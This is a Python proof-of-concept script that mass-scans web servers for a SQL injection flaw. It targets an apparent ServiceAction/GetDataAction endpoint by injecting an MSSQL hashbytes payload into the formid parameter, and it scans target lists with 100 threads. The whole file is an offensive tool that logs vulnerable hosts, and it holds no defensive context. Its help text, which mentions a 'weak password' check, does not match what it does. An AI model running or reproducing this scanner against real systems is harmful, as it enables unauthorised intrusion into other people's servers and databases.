#-*- coding: utf-8 -*-
import argparse
import sys
import textwrap
from multiprocessing.dummy import Pool

import requests
requests.packages.urllib3.disable_warnings()



def banner():
    test = """
            @author:qyf                                       
"""
    print(test)
headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept-Encoding": "gzip,deflate",
    }
proxies = {
        "http": "127.0.0.1:8080",
        "https": "127.0.0.1:8080"
    }
def poc(target):
    url = target+"/ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a"


    res = requests.post(url,headers=headers,verify=False,proxies=proxies, timeout=5).text
    if "200" in res:
            print(f"[+] {target} is valuable,")
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
    else:
            print(f"[-] {target} is not valuable")


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal Admin weak PassWord')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example:http: // www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        print(f"我在使用-f参数 批量跑{args.file}")
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
if __name__ == '__main__':
      main()